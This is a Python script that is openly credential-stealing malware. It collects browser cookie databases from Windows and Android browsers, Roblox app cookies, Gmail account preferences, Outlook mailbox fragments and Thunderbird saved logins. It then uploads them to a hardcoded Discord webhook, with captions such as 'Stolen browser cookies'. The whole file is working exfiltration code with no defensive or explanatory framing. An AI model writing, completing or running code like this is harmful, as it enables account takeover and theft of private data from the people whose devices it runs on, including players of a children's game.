import os
import json
import requests
import tempfile
import shutil
import glob
import base64

# === CONFIGURATION ===
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1403034711357521951/3ENMQHsXdrmRF4y_bD0khVkPIGlQfz2moJzub5sudmCq73Kj-7gnO66_9ax92YuoUoo0"
LOGGING_URL = "https://your-logging-link.com"  # Hosted link for logging visits

def send_discord_message(content):
    data = {
        "content": content
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception as e:
        pass

def send_discord_file(file_path, caption=""):
    with open(file_path, "rb") as f:
        files = {"file": (os.path.basename(file_path), f)}
        data = {"content": caption}
        try:
            requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
        except Exception as e:
            pass

def log_visit():
    try:
        requests.get(LOGGING_URL)
    except Exception:
        pass

def find_browser_cookies():
    cookie_files = []
    home = os.path.expanduser("~")
    android_paths = [
        "/data/data/com.android.chrome/app_chrome/Default/Cookies",
        "/data/data/org.chromium.chrome/app_chrome/Default/Cookies",
        "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies",
        "/data/data/org.mozilla.firefox/files/mozilla/*.default/cookies.sqlite"
    ]
    # Windows Chrome/Edge/Brave/Opera
    windows_paths = [
        home + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies",
        home + r"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
        home + r"\AppData\Roaming\Opera Software\Opera Stable\Cookies",
        home + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        home + r"\AppData\Roaming\Mozilla\Firefox\Profiles\*\cookies.sqlite"
    ]
    for path in android_paths:
        if "*" in path:
            for f in glob.glob(path):
                if os.path.exists(f):
                    cookie_files.append(f)
        elif os.path.exists(path):
            cookie_files.append(path)
    for path in windows_paths:
        if "*" in path:
            for f in glob.glob(path):
                if os.path.exists(f):
                    cookie_files.append(f)
        elif os.path.exists(path):
            cookie_files.append(path)
    return cookie_files

def find_roblox_cookies_android():
    """
    Attempts to find Roblox cookies on Android devices.
    Returns a list of tuples: (filename, filedata)
    """
    roblox_cookies = []
    # Roblox Android app data directory
    roblox_data_paths = [
        "/data/data/com.roblox.client/shared_prefs/com.roblox.client.default.xml",
        "/data/data/com.roblox.client/app_webview/Cookies",
        "/data/data/com.roblox.client/app_webview/Default/Cookies",
        "/data/data/com.roblox.client/files/cookies.txt",
        "/data/data/com.roblox.client/files/webviewCookiesChromium.db"
    ]
    for path in roblox_data_paths:
        if os.path.exists(path):
            try:
                with open(path, "rb") as f:
                    data = f.read()
                    # If it's a text file, decode for readability
                    try:
                        data_decoded = data.decode("utf-8")
                        roblox_cookies.append((os.path.basename(path), data_decoded))
                    except Exception:
                        roblox_cookies.append((os.path.basename(path), base64.b64encode(data).decode()))
            except Exception:
                pass
    # Also check for any cookies in webview or Chromium directories
    # (wildcard search for files named "Cookies" or "cookies.txt")
    extra_patterns = [
        "/data/data/com.roblox.client/app_webview/*/Cookies",
        "/data/data/com.roblox.client/files/*.txt"
    ]
    for pattern in extra_patterns:
        for f in glob.glob(pattern):
            if os.path.exists(f):
                try:
                    with open(f, "rb") as file:
                        data = file.read()
                        try:
                            data_decoded = data.decode("utf-8")
                            roblox_cookies.append((os.path.basename(f), data_decoded))
                        except Exception:
                            roblox_cookies.append((os.path.basename(f), base64.b64encode(data).decode()))
                except Exception:
                    pass
    return roblox_cookies

def steal_email_credentials():
    # Try to find common email client credentials (Android/Windows)
    creds = []
    # Android Gmail (tokens)
    gmail_token = "/data/data/com.google.android.gm/shared_prefs/AccountPrefs.xml"
    if os.path.exists(gmail_token):
        try:
            with open(gmail_token, "r", encoding="utf-8") as f:
                creds.append(("Gmail AccountPrefs.xml", f.read()))
        except Exception:
            pass
    # Windows Outlook
    outlook_path = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Outlook"
    if os.path.exists(outlook_path):
        for file in os.listdir(outlook_path):
            if file.endswith(".ost") or file.endswith(".pst"):
                try:
                    with open(os.path.join(outlook_path, file), "rb") as f:
                        data = base64.b64encode(f.read(4096)).decode()
                        creds.append((file, data))
                except Exception:
                    pass
    # Windows Thunderbird
    thunderbird_path = os.path.expanduser("~") + r"\AppData\Roaming\Thunderbird\Profiles"
    if os.path.exists(thunderbird_path):
        for root, dirs, files in os.walk(thunderbird_path):
            for file in files:
                if file == "logins.json":
                    try:
                        with open(os.path.join(root, file), "r", encoding="utf-8") as f:
                            creds.append(("Thunderbird logins.json", f.read()))
                    except Exception:
                        pass
    return creds

def main():
    # Log the visit
    log_visit()

    # Steal browser cookies
    cookie_files = find_browser_cookies()
    if cookie_files:
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "cookies.zip")
        import zipfile
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
            for file in cookie_files:
                try:
                    arcname = os.path.basename(file)
                    zipf.write(file, arcname)
                except Exception:
                    pass
        send_discord_file(zip_path, caption="Stolen browser cookies")
        shutil.rmtree(temp_dir, ignore_errors=True)
    else:
        send_discord_message("No browser cookies found.")

    # Steal Roblox cookies from phone (Android)
    roblox_cookies = find_roblox_cookies_android()
    if roblox_cookies:
        msg = "Stolen Roblox cookies from phone:\n"
        for name, data in roblox_cookies:
            msg += f"\n--- {name} ---\n"
            if len(data) > 1500:
                msg += data[:1500] + "\n...[truncated]...\n"
            else:
                msg += data + "\n"
        send_discord_message(msg)
    else:
        send_discord_message("No Roblox cookies found on phone.")

    # Steal email credentials
    creds = steal_email_credentials()
    if creds:
        msg = "Stolen email credentials:\n"
        for name, data in creds:
            msg += f"\n--- {name} ---\n"
            if len(data) > 1500:
                msg += data[:1500] + "\n...[truncated]...\n"
            else:
                msg += data + "\n"
        send_discord_message(msg)
    else:
        send_discord_message("No email credentials found.")

if __name__ == "__main__":
    main()
